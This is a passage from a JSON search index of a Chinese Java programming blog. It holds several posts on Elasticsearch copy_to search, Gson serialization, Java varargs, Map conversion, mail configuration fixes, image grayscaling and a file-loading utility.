'11qek3wB-kdeh8MFm4bN'. Preview of field's value: '{pwd=yihui, user=yihui}'\", \"caused_by\" : { \"type\" : \"illegal_state_exception\", \"reason\" : \"Can't get text on a START_OBJECT at 4:10\" } }, \"status\" : 400} 2. 部分字段组合搜索上面介绍的是全量的数据凭借到allColumnValue，从而实现全文检索；可能在实际的场景中，我只是希望对部分的field进行联合检索，基于此可以如下设置 123456789101112131415161718192021222324PUT search_union_demo { \"mappings\": { \"properties\": { \"allColumnValue\" : { \"type\" : \"text\" }, \"name\": { \"type\" : \"keyword\", \"ignore_above\" : 512, \"copy_to\" : [ \"allColumnValue\" ] }, \"site\" : { \"type\" : \"keyword\", \"ignore_above\" : 512, \"copy_to\" : [ \"allColumnValue\" ] } } }} 新增两个数据 12345678910111213141516171819POST search_union_demo/_doc{ \"name\": \"test\", \"site\": \"spring.hhui.top\", \"ddd\": { \"user\": \"一灰\", \"pwd\": \"yihui\" }}POST search_union_demo/_doc{ \"name\": \"一灰\", \"site\": \"blog.hhui.top\", \"ddd\": { \"user\": \"yihui\", \"pwd\": \"yihui\" }} 然后我们检索一灰时，可以查到第二条数据 12345678GET search_union_demo/_search{ \"query\": { \"match\": { \"allColumnValue\": \"一灰\" } }} 输出结果 123456789101112131415161718192021222324252627282930313233{ \"took\" : 2, \"timed_out\" : false, \"_shards\" : { \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 1, \"relation\" : \"eq\" }, \"max_score\" : 1.2814486, \"hits\" : [ { \"_index\" : \"search_union_demo\", \"_type\" : \"_doc\", \"_id\" : \"2Fqjk3wB-kdeh8MFy4aC\", \"_score\" : 1.2814486, \"_source\" : { \"name\" : \"一灰\", \"site\" : \"blog.hhui.top\", \"ddd\" : { \"user\" : \"yihui\", \"pwd\" : \"yihui\" } } } ] }} 3. 小结本文主要介绍借助copy_to，来实现es的联合/全文搜索的功能；通过简单的设置，来支撑更友好的查询场景 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/10/18/211018-ElasticSearch全文搜索支持配置/"},{"title":"211011-构建一个创建Map的工具类来辅助理解可变传参","text":"虽说java作为编译语言，但是它本身也提供了很多运行时能力，今天介绍一个非常基础的知识点，可变参数传递 在日常的开发过程中，创建Map对象还是比较常见的，现在我希望写一个工具类，可以非常简单创建并初始化Map对象 因此我们可以实现一个MapUtil工具类，来支持这个场景 12345678 public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v, Object... kv) { Map&lt;K, V&gt; ans = new HashMap&lt;&gt;(); ans.put(k, v); for (int i = 0; i &lt; kv.length; i += 2) { ans.put((K) kv[i], (V) kv[1]); } return ans;} 注意一下上面的实现，kv这个参数就是我们要说的可变参数，在方法内部，kv可以看成是一个数组对象（而且是安全的对象，当不传递时，它的取值也不是null） 在使用可变参数时，下面是一些需要注意的点 可变参数注意与数组参数的冲突 注意下面的两个方法，不能同时出现，直接出现编译错误 12public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v, Object... kv)public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v, Object[] kv) 重载的选择 如果只有一个可变参数的方法，newMap(&quot;key&quot;, &quot;value&quot;)不会报错，会直接访问下面这个方法，kv参数为空数组 1public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v, Object... kv) 当出现重载时，即如下 12public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v, Object... kv)public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v) 上面两个方法的调用，如果传参只有两个时，会调用哪个？ newMap(&quot;key&quot;, &quot;value&quot;) 调用的下面的方法 `newMap(“key”, “value”, “k”, “v”) 调用的上面的方法 可变参数传数组会怎样 虽说我们在使用的时候，将可变参数当做数组来使用，但是传递时，若传数组，是否可行呢？ 1234567891011121314public static &lt;K, V&gt; Map&lt;K, V&gt; newMap(K k, V v, Object... kv) { Map&lt;K, V&gt; ans = new HashMap&lt;&gt;(); ans.put(k, v); for (int i = 0; i &lt; kv.length; i += 2) { ans.put((K) kv[i], (V) kv[1]); } return ans;}@Testpublic void tt() { Map map = newMap(\"key\", \"value\", new Object[]{\"1\", \"2\"}); System.out.println(map);} 实际输出如下 1{1=2, key=value} 从实际测试来看，传数组并没有问题 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/10/11/211011-构建一个创建Map的工具类来辅助理解可变传参/"},{"title":"210826-实战小技巧13：进制转换很简单","text":"每天一个实战小技巧，进制转换很简单 进制转换，属于基本技能了，在java中要实现进制转换很简单，可以非常简单的实现，接下来我们来看下它的使用姿势 1. toString实现进制转换Integer/Long#toString(int i, int radix) 可以将任一进制的整数，转换为其他任意进制的整数 第一个参数：待转换的数字 第二个参数：转换后的进制位 十六进制转十进制 1Integer.toString(0x12, 10) 八进制转是十进制 1Integer.toString(012, 10) 八进制转二进制 1Integer.toString(012, 2) 2. 十进制转二进制除了使用上面的姿势之外，可以直接使用toBinaryString来实现转二进制 12Integer.toBinaryString(2)Long.toBinaryString(2) 3. 十进制转八进制Integer/Long#toOctalString: 转八进制 1Integer.toOctalString(9) 4. 十进制转十六进制Integer/Long#toHexString: 转十六进制 1Integer.toHexString(10) 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 实战小技巧11：数组拷贝 实战小技巧12：数字格式化 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/26/210826-实战小技巧13-进制转换很简单/"},{"title":"211028-Email发送失败问题记录","text":"最近升级了一下SpringBoot的版本，结果发现之前工作的好好的邮件突然罢工了，罢工的原因还不止一个，接下来记录一下解决方案 1. Couldn’t connect to host, port: smtp.163.com, 25; timeout -1这个异常提示就有点搞人了，连接超时，之前可以现在居然不行，感觉是被针对了啊 上面这个问题，主要原因在于端口号的限制，如果项目中是使用SpringBoot封装的email客户端，可以调整一下配置参数 123456789101112131415161718192021spring: #邮箱配置 mail: host: smtp.163.com from: xhhuiblog@163.com # 使用自己的发送方用户名 + 授权码填充 username: password: default-encoding: UTF-8 port: 465 properties: mail: smtp: socketFactory: port: 465 class: javax.net.ssl.SSLSocketFactory fallback: false auth: true starttls: enable: true required: true 重点注意几个新增的配置 12345678910spring: mail: port: 465 properties: mail: smtp: socketFactory: port: 465 class: javax.net.ssl.SSLSocketFactory fallback: false 2. JavaMailSender no object DCH for MIME type multipart/mixed从堆栈信息上来看，主要问题貌似是MIME不合法，从网上检索来的结果来看，大概是因为版本的问题，导致META-INF下的数据加载异常 参考 https://stackoverflow.com/questions/21856211/javax-activation-unsupporteddatatypeexception-no-object-dch-for-mime-type-multi 这个问答里的解决方案 方案一：设置MailcapCommandMap在具体的发送之前，添加下面这段代码 12345678910111213// Original answer from Som:MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap();mc.addMailcap(\"text/html;; x-java-content-handler=com.sun.mail.handlers.text_html\");mc.addMailcap(\"text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml\");mc.addMailcap(\"text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain\");mc.addMailcap(\"multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed\");mc.addMailcap(\"message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822\");// Additional elements to make DSN work mc.addMailcap(\"multipart/report;; x-java-content-handler=com.sun.mail.dsn.multipart_report\");mc.addMailcap(\"message/delivery-status;; x-java-content-handler=com.sun.mail.dsn.message_deliverystatus\");mc.addMailcap(\"message/disposition-notification;; x-java-content-handler=com.sun.mail.dsn.message_dispositionnotification\");mc.addMailcap(\"text/rfc822-headers;; x-java-content-handler=com.sun.mail.dsn.text_rfc822headers\"); 实测结果：依然没有解决问题 方案二： 指定activation版本1234567891011&lt;dependency&gt; &lt;groupId&gt;com.sun.mail&lt;/groupId&gt; &lt;artifactId&gt;javax.mail&lt;/artifactId&gt; &lt;version&gt;1.6.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;javax.activation&lt;/groupId&gt; &lt;artifactId&gt;activation&lt;/artifactId&gt; &lt;version&gt;1.1.1&lt;/version&gt; &lt;/dependency&gt; 基于上面这种方案，要求我们使用的客户端是javax.mail，然而SpringBoot-Email封装是jakarta,.mail它做的 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; 放弃了使用这种姿势进行尝试 方案三：setContextClassLoader这种方式比较简单，在执行邮件发送前，添加下面这一行代码 1Thread.currentThread().setContextClassLoader(javax.mail.Message.class.getClassLoader()); 实测结果：可行 根据描述结果来看，主要是通过这一个声明来允许加载META-INF/mailcap allow javax.activation bundle to load the “META-INF/mailcap” resource from the javax.mail bundle 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/10/28/211028-Email发送失败问题记录/"},{"title":"211030-Gson流式序列化JsonWriter","text":"通常我们序列化使用时，是直接使用Gson将整个对象转换为Json串，如果有看过gson源码的小伙伴会发现其内部实际上是基于JsonWriter来实现流式序列化的 接下来我们来看一下JsonWriter的使用姿势 首先需要获取JsonWriter对象，在创建时需要指定输出流 1JsonWriter writer = new JsonWriter(new OutputStreamWriter(System.out)); 接下来看一下流式的序列化输出可以怎么整 123456writer.beginObject() .name(\"name\").value(\"一灰灰blog\") .name(\"age\").value(24) .name(\"email\").nullValue() .endObject();writer.close(); 注意上面的实现，对于普通对象而言，流式使用 beginObject() 开头，使用endObject()结尾 在中间，通过 name指定json串的key，value为json串的值 比如上面的执行输出为 1{\"name\":\"一灰灰blog\",\"age\":24,\"email\":null} 如果对象内部嵌套了对象或者数组，同样是通过beginObject/beginArray来处理 123456789101112JsonWriter writer = new JsonWriter(new OutputStreamWriter(System.out));writer.beginObject() .name(\"name\").value(\"一灰灰blog\") .name(\"age\").value(24) .name(\"email\").nullValue() .name(\"skill\") .beginArray() .value(\"Java\") .value(\"Python\") .endArray() .endObject();writer.close(); 输出如下: 1{\"name\":\"一灰灰blog\",\"age\":24,\"email\":null,\"skill\":[\"Java\",\"Python\"]} 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/10/30/211030-Gson流式序列化JsonWriter/"},{"title":"211025-Gson之序列化指定忽略字段的写法","text":"在我们日常使用json序列化框架过程中，经常会遇到在输出json字符串时，忽略某些字段，那么在Gson框架中，要想实现这种方式，可以怎么处理呢？ 本文介绍几种常见的姿势 1. transient关键字最容易想到的case，就是直接借助jdk的transient关键字来修饰不希望输出的对象，如 12345678@Data@AllArgsConstructor@NoArgsConstructorpublic static class GItem { private String user; // @IgnoreField private transient String pwd;} 上面的对象中，pwd前面使用transient进行修饰，那么在输出json串时，默认会忽略 123456@Testpublic void testPrint() { GItem item = new GItem(\"一灰灰\", \"yihui\"); String ans = new Gson().toJson(item); System.out.println(ans);} 输出如 1{\"user\":\"一灰灰\"} 2. expose注解借助gson提供的expose注解，也可以实现上面的case，如在需要保留的字段上添加@Expose 123456789@Data@AllArgsConstructor@NoArgsConstructorpublic static class GItem { @Expose private String user; // @IgnoreField private String pwd;} 然后我们使用的地方，注意通过 GsonBuilder来创建Gson对象 123456@Testpublic void testPrint() { GItem item = new GItem(\"一灰灰\", \"yihui\"); String ans = new GsonBuilder().excludeFieldsWithoutExposeAnnotation().create().toJson(item); System.out.println(ans);} 上面这种使用姿势感觉有点怪怪的，在需要保留的字段上添加注解，这种使用方式并没有jackson的@JsonIgnore方式来得方便 3. 自定义排查策略ExclusionStrategy除了上面两种方式之外，通过自定义的排除策略可以实现即使不修改bean，也能指定哪些字段不序列化 一个简单的demo如下，如果包含自定义的注解，则不序列化，或者field_name == pwd也不序列化 123456789101112131415161718192021222324252627282930313233343536373839@Target({ElementType.ANNOTATION_TYPE, ElementType.FIELD, ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface IgnoreField {}@Testpublic void testExclude() { Gson gson = new GsonBuilder().setExclusionStrategies(new ExclusionStrategy() { @Override public boolean shouldSkipField(FieldAttributes fieldAttributes) { if (fieldAttributes.getAnnotation(IgnoreField.class) != null) { // 包含这个注解的，直接忽略 return true; } // 成员白名单 if (fieldAttributes.getName().equalsIgnoreCase(\"pwd\")) { return true; } return false; } @Override public boolean shouldSkipClass(Class&lt;?&gt; aClass) { if (aClass.isAnnotationPresent(IgnoreField.class)) { return true; } return false; } }).registerTypeAdapterFactory(new MyMapTypeAdapterFactory(new ConstructorConstructor(new HashMap&lt;&gt;()), false)).create(); GItem item = new GItem(); item.setUser(\"一灰灰\"); item.setPwd(\"123456\"); System.out.println(gson.toJson(item));} 上面这种姿势，更适用于有自定义需求场景的case，那么问题来了，如果我希望序列化的对象，并不是JOPO对象，比如传入的是一个Map，也希望针对某些key进行忽略，可以怎么整呢？ II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/10/25/211025-Gson之序列化指定忽略字段的写法/"},{"title":"211029-Gson实现Map忽略指定key序列化输出策略","text":"前面介绍了几种gson在序列化时，忽略某些字段数输出的方式，然而当时的实例中，需要序列化的对象都是Java bean对象，如果我们需要序列化的是Map对象，又可以怎么处理呢？ 接下来我们通过实际的case，来演示如何实现Map忽略指定key的功能 这里主要用到的知识点是Gson提供的扩展TypeAdapter，通过自定义的适配器，来实现自定义的序列化/反序列化，如我们需要实现的逻辑如下 12345678910111213141516171819202122232425262728293031323334public static class IgnoreMapTypeAdapter extends TypeAdapter&lt;HashMap&gt; { @Override public void write(JsonWriter out, HashMap value) throws IOException { Set&lt;Map.Entry&lt;Object, Object&gt;&gt; set = value.entrySet(); out.beginObject(); for (Map.Entry&lt;Object, Object&gt; entry : set) { // 在序列化输出时，忽略 key = pwd 的kv String strKey = String.valueOf(entry.getKey()); if (strKey.equalsIgnoreCase(\"pwd\")) { continue; } out.name(strKey); Object v = entry.getValue(); if (v instanceof String) { out.value((String) v); } else if (v instanceof Number) { out.value((Number) v); } else if (v instanceof Boolean) { out.value((Boolean) v); } else { out.value(getGson().toJson(entry.getValue())); } } out.endObject(); } @Override public HashMap read(JsonReader in) throws IOException { // 这里直接使用标准的gson进行反序列化 Gson gson = new Gson(); return gson.fromJson(in, HashMap.class); }} 注意上面实现逻辑中的write方法，遍历map，这里默认将所有的key都当成String格式，内部的实现主要是基于gson的流式序列化策略来完成的（JsonWrite流式序列化，下篇博文介绍） 其次对于value的输出，这里做了简单的适配，如果是非基础类型，这里并没有使用普通的Gson进行转换，而是借助了递归的思路，关键点在于 etGson()的实现逻辑 123private static Gson getGson() { return new GsonBuilder().registerTypeAdapter(HashMap.class, new IgnoreMapTypeAdapter()).create();} 接下来写个简单的case验证一下 12345678910111213141516171819private static Map&lt;String, Object&gt; newMap(String key, Object val, Object... kv) { Map&lt;String, Object&gt; ans = new HashMap&lt;&gt;(8); ans.put(key, val); for (int i = 0, size = kv.length; i &lt; size; i += 2) { ans.put(String.valueOf(kv[i]), kv[i + 1]); } return ans;}@Testpublic void testCase() { Gson gson = getGson(); Map map = newMap(\"user\", \"yihui\", \"pwd\", 123455, \"sub\", newMap(\"key\", \"lll\", \"v\", 1234L, \"pwd\", \"abc\"), \"list\", Arrays.asList(1, 2, 3)); String str = gson.toJson(map); System.out.println(str); System.out.println(new Gson().toJson(map));} 输出结果如下 12{\"sub\":\"{\\\"key\\\":\\\"lll\\\",\\\"v\\\":1234}\",\"list\":\"[1,2,3]\",\"user\":\"yihui\"}{\"sub\":{\"pwd\":\"abc\",\"key\":\"lll\",\"v\":1234},\"pwd\":123455,\"list\":[1,2,3],\"user\":\"yihui\"} 注意查看上面的实现，第一行是忽略了pwd的json串，第二行则是普通的Gson输出的json串；虽然第一个满足了我们的需求，但是sub的value从object变成了String，这个和我们的预期的不太一致，接下来，下一篇博文流式序列化将带来解决方案 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/10/28/211029-Gson实现Map忽略指定key序列化输出策略/"},{"title":"211102-实战小技巧18:Map转换的几种方式","text":"在日常开发过程中，从一个Map转换为另外一个Map属于基本操作了，那么我们一般怎么去实现这种场景呢？有什么更简洁省事的方法么？ 实例场景现在我们给一个简单的实例 希望将一个Map&lt;String, Integer&gt; 转换成 Map&lt;String, String&gt;，接下来看一下有哪些实现方式，以及各自的优缺点 首先提供一个创建Map的公共方法 12345678private static &lt;T&gt; Map&lt;String, T&gt; newMap(String key, T val, Object... kv) { Map&lt;String, T&gt; ans = new HashMap&lt;&gt;(8); ans.put(key, val); for (int i = 0, size = kv.length; i &lt; size; i += 2) { ans.put(String.valueOf(kv[i]), (T) kv[i + 1]); } return ans;} 方式一：基本的for循环转换这种方式是最容易想到和实现的，直接for循环来转换即可 123456789@Testpublic void forEachParse() { Map&lt;String, Integer&gt; map = newMap(\"k\", 1, \"a\", 2, \"b\", 3); Map&lt;String, String&gt; ans = new HashMap&lt;&gt;(map.size()); for (Map.Entry&lt;String, Integer&gt; entry: map.entrySet()) { ans.put(entry.getKey(), String.valueOf(entry.getValue())); } System.out.println(ans);} 这种方式的优点很明显，实现容易，业务直观； 缺点就是可复用性较差，代码量多（相比于下面的case） 方式二：容器的流式使用在jdk1.8提供了流式操作，同样也可以采用这种方式来实现转换 1234567@Testpublic void stream() { Map&lt;String, Integer&gt; map = newMap(\"k\", 1, \"a\", 2, \"b\", 3); Map&lt;String, String&gt; ans = map.entrySet().stream().collect( Collectors.toMap(Map.Entry::getKey, s -&gt; String.valueOf(s.getValue()), (a, b) -&gt; a)); System.out.println(ans);} 使用stream的方式，优点就是链式，代码量少；缺点是相较于上面的阅读体验会差一些（当然这个取决于个人，有些小伙伴就更习惯看这种链式的代码） 方式三：Guava的trasform方式从代码层面来看，上面两个都不够直观，如果对guava熟悉的小伙伴对下面的代码可能就很熟悉了 123456@Testpublic void transfer() { Map&lt;String, Integer&gt; map = newMap(\"k\", 1, \"a\", 2, \"b\", 3); Map&lt;String, String&gt; ans = Maps.transformValues(map, String::valueOf); System.out.println(ans);} 核心逻辑就一行 Maps.transformValues(map, String::valueOf)，实现了我们的Map转换的诉求 很明显，这种方式的优点就是间接、直观；当然缺点就是需要引入guava，并且熟悉guava 最后一问，这篇文章目的是啥？既然我们的标题是实战小技巧，本文除了给大家介绍可以使用guava的Maps.transformValues来实现map转换之外，更主要的一个目的是如果让我们自己来实现一个工具类，来支持这个场景，应该怎么做？ 直接提供一个转换方法？ 第一步：一个泛型的转换接口 12public &lt;K, T, V&gt; Map&lt;K, V&gt; transform(Map&lt;K, T&gt; map) {} 定义上面这个接口之后，自然而然想到的缺点就是差一个value的转换实现 第二步：value转换的定义 这里采用Function接口思想来定义转换类 12public &lt;K, T, V&gt; Map&lt;K, V&gt; transform(Map&lt;K, T&gt; map, Function&lt;T, V&gt; func) {} 当然到这里我们就需要注意jdk1.8以下是不支持函数编程的，那么我们可以怎么来实现呢？ 这个时候再对照一下guava的实现，然后再手撸一个，知识点就到手了 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/02/211102-实战小技巧18-Map转换的几种方式/"},{"title":"211105-Gson流式反序列化JsonReader","text":"前面介绍了一片Gson的流式序列化，接下来我们看一下流式的反序列化，主要借助JsonReader来实现 1. 关键类与方法流式反序列化，关键实现类为 JsonReader，每次在使用前后需要通过 beginObject/endObject来声明一个序列化的过程 1234JsonReader reader = new JsonReader(new StringReader(json));reader.beginObject(); // throws IOException// ....reader.endObject(); 2. 实例演示接下来通过一个实例来演示流式的反序列化过程 json串 &quot;{\\&quot;user\\&quot;: \\&quot;一灰灰blog\\&quot;, \\&quot;age\\&quot;: 18}&quot; 反序列化过程 123456789101112131415161718192021222324@Datapublic static class User { private String user; private int age;}@Testpublic void testReader() throws IOException { String str = \"{\\\"user\\\": \\\"一灰灰blog\\\", \\\"age\\\": 18}\"; User user = new User(); JsonReader reader = new JsonReader(new StringReader(str)); reader.beginObject(); while(reader.hasNext()) { String key = reader.nextName(); if (\"user\".equalsIgnoreCase(key)) { user.setUser(reader.nextString()); } else if (\"age\".equalsIgnoreCase(key)) { user.setAge(reader.nextInt()); } } reader.endObject(); System.out.println(user);} 从上面的反序列化case，可以看出对于一层json串而言，比较简单，那么如果json串中的value是一个对象，或者数组，那改怎么处理呢？ 如我们在User类中，新增一个列表对象 12345678910111213141516171819202122232425262728293031323334@Datapublic static class User { private String user; private int age; private List&lt;String&gt; skills;}@Testpublic void testReader() throws IOException { String str = \"{\\\"user\\\": \\\"一灰灰blog\\\", \\\"age\\\": 18, \\\"skills\\\": [\\\"java\\\", \\\"python\\\"]}\"; User user = new User(); JsonReader reader = new JsonReader(new StringReader(str)); reader.beginObject(); while(reader.hasNext()) { String key = reader.nextName(); if (\"user\".equalsIgnoreCase(key)) { user.setUser(reader.nextString()); } else if (\"age\".equalsIgnoreCase(key)) { user.setAge(reader.nextInt()); } else if (\"skills\".equalsIgnoreCase(key)) { // 注意这个实现，支持了嵌套的操作 reader.beginArray(); List&lt;String&gt; skills = new ArrayList&lt;&gt;(); while (reader.hasNext()) { skills.add(reader.nextString()); } user.setSkills(skills); reader.endArray(); } } reader.endObject(); System.out.println(user);} 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/05/211105-Gson流式反序列化/"},{"title":"211112-Java实现图片灰度化","text":"本文通过一个简单的实例，演示如何使用java来实现图片灰度化处理，主要借助下面两种策略来处理颜色 灰度化公式 1avgColor = red * 0.299f + green * 0.587f + blue * 0.114f 均值方式 1avgColor = (red + green + blue) / 3.0f 基于上面两种方式，我们要实现一个图片灰度化的处理，无非就是获取图片的每个像素点的颜色，然后计算avgColor，再用新的颜色填充即可 一个基础的实现演示如下 1234567891011121314151617181920212223242526272829303132333435private Color avg1(int red, int green, int blue) { int avg = Math.round((red * 0.299f + green * 0.587f + blue * 0.114f)); return new Color(avg, avg, avg);}private Color avg2(int red, int green, int blue) { int avg = Math.round((red + green + blue) / 3); return new Color(avg, avg, avg);}@Testpublic void testRender() throws IOException { String file = \"http://i0.download.fd.52shubiao.com/t_960x600/g1/M00/10/17/oYYBAFWvR5-IeXHuAAd5kPb8eSgAACm0QF50xIAB3mo414.jpg\"; // 从网络上下载图片 BufferedImage img = ImageIO.read(FileReadUtil.getStreamByFileName(file)); int w = img.getWidth(), h = img.getHeight(); // 创建新的灰度图片画板 BufferedImage gray = new BufferedImage(w, h, img.getType()); Graphics2D g2d = gray.createGraphics(); g2d.setColor(null); g2d.fillRect(0, 0, w, h); for (int x = 0; x &lt; w; x++) { for (int y = 0; y&lt;h; y++) { // 针对像素点的颜色灰度化之后，重新绘制 int color = img.getRGB(x, y); Color grayColor = avg1((color &amp; 0xff0000) &gt;&gt; 16, (color &amp; 0xff00) &gt;&gt; 8, color &amp; 0x0000ff); g2d.setColor(grayColor); g2d.fillRect(x, y, 1, 1); } } g2d.dispose(); System.out.printf(\"渲染完成\");} 生成原图与灰度图的对比如下 注意上面的实现，其中加载网络图片的具体实现，之前的博文有介绍，有兴趣的小伙伴可以参考: 封装一个根据路径获取文件资源的工具类 此外介绍一个更好用的姿势，直接使用开源项目 https://github.com/liuyueyi/quick-media 来实现灰度处理 使用这个项目的 image-plugins 之后，生成一个灰度图就很简单了 12345678910@Testpublic void testImgGrayAlg() { String img = \"https://c-ssl.duitang.com/uploads/item/201809/16/20180916175034_Gr2hk.thumb.1000_0.jpeg\"; BufferedImage out = ImgPixelWrapper.build() .setSourceImg(img) .setPixelType(PixelStyleEnum.GRAY_ALG) .build() .asBufferedImg(); System.out.println(out);} 注意这个ImgPixelWrapper封装类，处理基础的灰度处理之外，还支持生成字符图，图片像素化（如马赛克…） 至于quick-media这个项目就更有意思了，java侧若想生成酷炫的二维码，选择它绝对不会让你失望；有兴趣的小伙伴可以瞅一瞅 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/12/211112-Java实现图片灰度化/"},{"title":"211108-封装一个根据路径获取文件资源的工具类","text":"通常我们最多的场景是从本地资源中读取文件，这个时候我们经常需要注意的是相对路径、绝对路径问题； 除了从本地获取文件之外，从网络中获取文件资源（如图片）也属于相对常见的场景，接下来我们封装一个工具类，可以支持以上各种类型的数据读取 首先定义一个公共方法如下，内部支持四种方式的数据获取 相对路径 绝对路径 用户根目录 网络 1234567891011121314151617181920public static InputStream getStreamByFileName(String fileName) throws IOException { if (fileName == null) { throw new IllegalArgumentException(\"fileName should not be null!\"); } if (fileName.startsWith(\"http\")) { // 网络地址 return new URL(fileName).openConnection().getInputStream(); } else if (BasicFileUtil.isAbsFile(fileName)) { // 绝对路径 Path path = Paths.get(fileName); return Files.newInputStream(path); } else if (fileName.startsWith(\"~\")) { // 用户目录下的绝对路径文件 fileName = BasicFileUtil.parseHomeDir2AbsDir(fileName); return Files.newInputStream(Paths.get(fileName)); } else { // 相对路径 return FileReadUtil.class.getClassLoader().getResourceAsStream(fileName); }} 请注意上面的实现，绝对路径与相对路径比较好理解，用户目录，这个处理又是怎样的呢？ 关键点在于，用户目录转绝对路径 借助System.getProperties系统属性来处理 12345678910/** * 将用户目录下地址~/xxx 转换为绝对地址 * * @param path * @return */public static String parseHomeDir2AbsDir(String path) { String homeDir = System.getProperties().getProperty(\"user.home\"); return StringUtils.replace(path, \"~\", homeDir);} 接下来再看如何判断一个路径是否为绝对路径呢？ 这里需要格外注意不同操作系统的差异性，比如win，区分C盘，D盘，但是mac/linux则不分这个，上面判断的核心逻辑如下 12345678910111213141516171819202122232425public static boolean isAbsFile(String fileName) { if (OSUtil.isWinOS()) { // windows 操作系统时，绝对地址形如 c:\\descktop return fileName.contains(\":\") || fileName.startsWith(\"\\\\\"); } else { // mac or linux return fileName.startsWith(\"/\"); }}/** * 是否windows系统 */public static boolean isWinOS() { boolean isWinOS = false; try { String osName = System.getProperty(\"os.name\").toLowerCase(); String sharpOsName = osName.replaceAll(\"windows\", \"{windows}\").replaceAll(\"^win([^a-z])\", \"{windows}$1\") .replaceAll(\"([^a-z])win([^a-z])\", \"$1{windows}$2\"); isWinOS = sharpOsName.contains(\"{windows}\"); } catch (Exception e) { e.printStackTrace(); } return isWinOS;} 除了上面的三种本地资源获取之外，还有一个就是网络资源的读取，上面介绍的实现姿势主要是基于JDK原生的URL，在实际使用时，这个并不稳定，不能确定能获取到完整的数据，原则上不推荐使用；如果可以，使用http-client/okhttp都是不错的选择 最后给一个简单的测试 最后一个简单下载图片的case 123String img = \"https://c-ssl.duitang.com/uploads/item/201809/16/20180916175034_Gr2hk.thumb.1000_0.jpeg\";BufferedImage pic = ImageIO.read(FileReadUtil.getStreamByFileName(img));System.out.println(pic); 